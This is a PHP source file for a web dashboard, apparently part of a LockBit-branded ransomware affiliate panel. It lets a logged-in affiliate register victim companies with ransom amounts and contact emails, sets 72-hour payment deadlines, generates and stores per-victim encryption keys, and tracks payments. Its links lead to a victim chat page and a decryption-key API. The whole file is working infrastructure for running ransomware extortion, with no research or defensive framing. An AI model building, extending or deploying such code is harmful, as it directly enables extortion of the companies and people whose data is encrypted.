<?php
session_start();
if (!isset($_SESSION['affiliate_id'])) { header('Location: index.php'); exit; }
require_once 'config/database.php';

// Add new victim
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_victim'])) {
    $companyName = $_POST['company_name'];
    $contactEmail = $_POST['contact_email'];
    $ransomAmount = floatval($_POST['ransom_amount']);
    $deadline = date('Y-m-d H:i:s', strtotime('+72 hours'));
    $encryptionKey = bin2hex(random_bytes(32));
    $victimId = strtoupper(substr(md5(uniqid()), 0, 8));
    
    $stmt = $db->prepare("INSERT INTO victims (victim_id, affiliate_id, company_name, contact_email, ransom_amount, deadline, encryption_key, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'encrypted')");
    $stmt->execute([$victimId, $_SESSION['affiliate_id'], $companyName, $contactEmail, $ransomAmount, $deadline, $encryptionKey]);
}

// Fetch all victims
$stmt = $db->prepare("SELECT * FROM victims WHERE affiliate_id = ? ORDER BY created_at DESC");
$stmt->execute([$_SESSION['affiliate_id']]);
$victims = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Victims Manager - LockBit</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .header { background: #111; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
        .header h1 { color: #ff0000; }
        .add-form { background: #111; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
        input, select { background: #222; color: #00ff00; border: 1px solid #333; padding: 10px; margin: 5px; width: 100%; font-family: 'Courier New', monospace; }
        .btn { background: #ff0000; color: #fff; padding: 10px 20px; border: none; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; background: #111; }
        th, td { padding: 12px; border: 1px solid #222; }
        th { background: #1a1a1a; color: #ff0000; }
    </style>
</head>
<body>
    <div class="header">
        <h1>📊 VICTIMS MANAGER</h1>
        <a href="dashboard.php" style="color:#00ff00;">Back to Dashboard</a>
    </div>
    
    <div class="add-form">
        <h2>Add New Victim</h2>
        <form method="POST">
            <input type="text" name="company_name" placeholder="Company Name" required>
            <input type="email" name="contact_email" placeholder="Contact Email">
            <input type="number" name="ransom_amount" placeholder="Ransom Amount ($)" step="0.01" required>
            <button type="submit" name="add_victim" class="btn">ADD VICTIM</button>
        </form>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>Victim ID</th>
                <th>Company</th>
                <th>Status</th>
                <th>Ransom</th>
                <th>Paid</th>
                <th>Deadline</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($victims as $victim): ?>
            <tr>
                <td><?php echo $victim['victim_id']; ?></td>
                <td><?php echo htmlspecialchars($victim['company_name']); ?></td>
                <td><?php echo strtoupper($victim['status']); ?></td>
                <td>$<?php echo number_format($victim['ransom_amount'], 2); ?></td>
                <td>$<?php echo number_format($victim['paid_amount'] ?? 0, 2); ?></td>
                <td><?php echo $victim['deadline']; ?></td>
                <td>
                    <a href="chat_system.php?victim_id=<?php echo $victim['id']; ?>" class="btn">Chat</a>
                    <a href="api/decrypt_key_api.php?action=get_key&victim_id=<?php echo $victim['id']; ?>" class="btn">Key</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
